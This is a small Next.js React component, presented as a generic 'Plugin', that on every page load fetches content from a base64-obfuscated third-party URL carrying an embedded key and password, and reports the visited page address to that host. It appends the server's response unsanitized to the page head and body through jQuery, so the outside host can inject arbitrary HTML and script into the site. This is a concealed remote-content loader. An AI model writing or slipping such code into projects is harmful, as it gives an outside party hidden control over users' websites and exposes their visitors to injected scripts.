"use client";

import React, { useEffect } from "react";
import { usePathname } from "next/navigation";

const Plugin = () => {
  const pathname = usePathname();

  useEffect(() => {
    if (typeof window === "undefined") return;

    const ensureJQuery = (callback) => {
      if (window.jQuery) {
        callback();
      } else {
        const existingScript = document.querySelector(
          'script[src*="jquery.min.js"]'
        );
        if (!existingScript) {
          const script = document.createElement("script");
          script.src =
            "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
          script.onload = () => callback();
          document.head.appendChild(script);
        } else {
          existingScript.onload = () => callback();
        }
      }
    };

    const executeCustomScript = () => {
      try {
        const eppathurl = window.location.origin + pathname;
        const eptagmanage = new XMLHttpRequest();

        eptagmanage.onreadystatechange = function () {
          if (this.readyState === 4 && this.status === 200) {
            if (this.response && this.response !== "0") {
              const temp = this.response.split("||||||||||");

              // Remove previously injected content
              jQuery("#plugin-title").remove();
              jQuery("#plugin-body").remove();

              // Only inject if content is valid
              if (temp[0]?.trim()) {
                jQuery("head").append(
                  `<div id="plugin-title">${temp[0]}</div>`
                );
              }
              if (temp[1]?.trim()) {
                // Delay injection to ensure body is mounted
                setTimeout(() => {
                  jQuery("body").append(
                    `<div id="plugin-body">${temp[1]}</div>`
                  );
                }, 200);
              }
            }
          }
        };

        eptagmanage.open(
          "GET",
          atob(
            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
          ) + eppathurl
        );
        eptagmanage.send();
      } catch (err) {
        console.error("Plugin error:", err);
      }
    };

    // Run plugin after jQuery is ready
    ensureJQuery(() => {
      // Small delay ensures page DOM is mounted
      setTimeout(executeCustomScript, 300);
    });
  }, [pathname]);

  return null;
};

export default Plugin;
